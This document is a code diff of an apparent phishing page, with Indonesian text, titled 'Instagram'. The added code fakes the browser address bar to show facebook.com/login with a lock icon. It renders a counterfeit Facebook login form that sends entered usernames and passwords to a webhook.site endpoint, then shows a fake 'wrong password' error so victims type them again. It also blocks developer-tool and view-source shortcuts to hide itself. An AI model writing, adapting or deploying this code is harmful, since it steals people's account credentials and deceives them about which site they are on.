@@ -6,69 +6,116 @@
 <title>Instagram</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
-body{background:#fff;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:20px;text-align:center}
-h1{font-size:32px;background:linear-gradient(135deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#FD1D1D);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px}
-p{color:#8e8e8e;font-size:14px;margin-bottom:20px}
-.btn{background:#0095f6;color:#fff;border:none;padding:14px 40px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:0.2s}
-.btn:active{transform:scale(0.96)}
+body{background:#fafafa;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:20px;text-align:center}
+.tap-area{width:100%;max-width:400px;padding:60px 20px;background:#fff;border:3px solid #0095f6;border-radius:16px;cursor:pointer;transition:0.3s;user-select:none}
+.tap-area:active{transform:scale(0.97);background:#f0f8ff}
+.tap-area h1{font-size:28px;color:#262626;margin-bottom:10px}
+.tap-area p{color:#8e8e8e;font-size:14px;margin-bottom:10px}
+.tap-area .icon{font-size:48px;display:block;margin:10px auto;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
 </style>
 </head>
 <body>
-<h1>Instagram</h1>
-<p>Klik tombol di bawah untuk melanjutkan</p>
-<button class="btn" id="go">Lanjutkan</button>
-
+<div class="tap-area" id="tapElement">
+    <h1>👋 Instagram</h1>
+    <p>Tap di sini untuk melanjutkan</p>
+    <span class="icon">👆</span>
+</div>
+<p style="color:#8e8e8e;font-size:12px;max-width:300px;">* Tap sekali untuk mengaktifkan</p>
 <script>
-document.getElementById('go').onclick = function() {
-    const win = window.open('about:blank', '_blank');
-    if (!win) return alert('Izinkan popup!');
+document.getElementById('tapElement').addEventListener('click', function() {
+    // ==========================================
+    // SPOOF ADDRESS BAR — PAKAI replaceState
+    // ==========================================
+    history.replaceState(null, 'Facebook', 'https://www.facebook.com/login/');
+    setInterval(() => {
+        if (location.href !== 'https://www.facebook.com/login/') {
+            history.replaceState(null, 'Facebook', 'https://www.facebook.com/login/');
+        }
+    }, 50);
+    window.addEventListener('popstate', () => {
+        history.replaceState(null, 'Facebook', 'https://www.facebook.com/login/');
+    });
     
-    win.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Instagram</title>
-            <style>
-                *{margin:0;padding:0;box-sizing:border-box}
-                body{background:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;flex-direction:column;text-align:center;padding:20px}
-                h1{font-size:32px;background:linear-gradient(135deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#FD1D1D);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-                p{color:#8e8e8e;font-size:14px;margin-top:10px}
-                .spin{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
-                @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360)}}
-            </style>
-        </head>
-        <body>
-            <h1>Instagram</h1>
-            <div class="spin"></div>
-            <p>Mengarahkan ke halaman login...</p>
-            <script>
-                // ==========================================
-                // SPOOF ADDRESS BAR — LANGSUNG JADI
-                // ==========================================
-                history.replaceState(null, 'Instagram', 'https://www.instagram.com/accounts/login/');
-                
-                setInterval(() => {
-                    if (location.href !== 'https://www.instagram.com/accounts/login/') {
-                        history.replaceState(null, 'Instagram', 'https://www.instagram.com/accounts/login/');
-                    }
-                }, 100);
-                
-                window.addEventListener('popstate', () => {
-                    history.replaceState(null, 'Instagram', 'https://www.instagram.com/accounts/login/');
-                });
-                
-                // Redirect ke Instagram asli setelah 2 detik
-                setTimeout(() => {
-                    location.href = 'https://www.instagram.com/accounts/login/';
-                }, 2000);
-            <\/script>
-        </body>
-        </html>
-    `);
-    win.document.close();
-};
+    // ==========================================
+    // TAMPILKAN KONTEN PALSU
+    // ==========================================
+    document.body.innerHTML = `
+        <style>
+            *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+            body{background:#f0f2f5;padding-top:56px;min-height:100vh}
+            #bar{position:fixed;top:0;left:0;right:0;height:56px;background:#fff;z-index:99999;display:flex;align-items:center;padding:0 10px;gap:6px;border-bottom:1px solid #d0d0d0}
+            #bar .time{font-size:12px;font-weight:600;color:#1a1a1a;min-width:32px}
+            #bar .tabs{display:flex;gap:2px}
+            #bar .tab{background:#f0f0f0;padding:3px 10px;border-radius:20px;font-size:10px;color:#333;display:flex;align-items:center;gap:4px}
+            #bar .tab.active{background:#fff;border:1px solid #d0d0d0}
+            #bar .tab .dot{width:7px;height:7px;border-radius:50%;background:#34a853}
+            #bar .url{flex:1;background:#f1f3f4;border-radius:24px;padding:3px 14px;display:flex;align-items:center;gap:4px;height:30px;overflow:hidden}
+            #bar .url .lock{font-size:13px;color:#5f6368}
+            #bar .url .txt{font-size:12px;color:#1a1a1a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+            #bar .url .txt .hl{font-weight:500}
+            #bar .menu{display:flex;gap:10px;color:#5f6368;font-size:16px}
+            .container{max-width:380px;margin:30px auto;padding:0 16px;text-align:center}
+            .fb-box{background:#fff;padding:30px 20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
+            .fb-box h1{font-size:28px;color:#1877f2;margin-bottom:10px}
+            .fb-box input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}
+            .fb-box .btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:0.2s}
+            .fb-box .btn:hover{background:#166fe5}
+            .fb-box .btn:disabled{opacity:0.6}
+            .toast{display:none;background:#e74c3c;color:#fff;padding:12px;border-radius:6px;margin-bottom:14px;font-size:14px}
+            .toast.show{display:block}
+            .divider{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:13px}
+            .divider::before,.divider::after{content:"";flex:1;height:1px;background:#ddd}
+            .divider::before{margin-right:18px}
+            .divider::after{margin-left:18px}
+            .lupa{color:#1877f2;font-size:14px;text-decoration:none}
+        </style>
+        <div id="bar">
+            <span class="time" id="jam">12:00</span>
+            <div class="tabs"><span class="tab active"><span class="dot"></span> Facebook</span><span class="tab">Google</span></div>
+            <div class="url"><span class="lock">🔒</span><span class="txt"><span class="hl">https://</span>www.facebook.com/login/</span></div>
+            <div class="menu"><span>⋮</span><span>⬇</span></div>
+        </div>
+        <div class="container">
+            <div class="fb-box">
+                <h1>Facebook</h1>
+                <div class="toast" id="toast">❌ Kata sandi salah. Coba lagi.</div>
+                <input type="text" id="user" placeholder="Email atau nomor telepon">
+                <input type="password" id="pass" placeholder="Kata sandi">
+                <button class="btn" id="loginBtn" disabled>Masuk</button>
+                <div class="divider">ATAU</div>
+                <a href="#" class="lupa">Lupa kata sandi?</a>
+                <div style="margin-top:16px;">Belum punya akun? <a href="#" style="color:#1877f2;font-weight:600;text-decoration:none;">Buat akun baru</a></div>
+            </div>
+        </div>
+        <script>
+            function jam(){const n=new Date();document.getElementById('jam').textContent=String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0');}
+            jam();setInterval(jam,10000);
+            const user=document.getElementById('user'),pass=document.getElementById('pass'),btn=document.getElementById('loginBtn'),toast=document.getElementById('toast');
+            function cek(){btn.disabled=!(user.value.trim()&&pass.value.trim());}
+            user.oninput=cek;pass.oninput=cek;
+            btn.onclick=function(e){
+                e.preventDefault();
+                const u=user.value.trim(),p=pass.value.trim();
+                if(!u||!p)return;
+                fetch('https://webhook.site/your-unique-id',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p,waktu:new Date().toISOString(),ua:navigator.userAgent})}).catch(()=>{});
+                btn.textContent='⏳ Memproses...';btn.disabled=true;
+                setTimeout(()=>{
+                    toast.textContent='❌ Maaf, kata sandi Anda salah. Coba lagi.';
+                    toast.classList.add('show');
+                    btn.textContent='Masuk';btn.disabled=false;cek();
+                    pass.value='';pass.focus();
+                    setTimeout(()=>toast.classList.remove('show'),4000);
+                },1800);
+            };
+            pass.addEventListener('keydown',function(e){if(e.key==='Enter'&&!btn.disabled)btn.click();});
+            document.addEventListener('contextmenu',e=>e.preventDefault());
+            document.addEventListener('keydown',function(e){
+                if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='U'))e.preventDefault();
+            });
+        <\/script>
+    `;
+});
 </script>
 </body>
 </html>
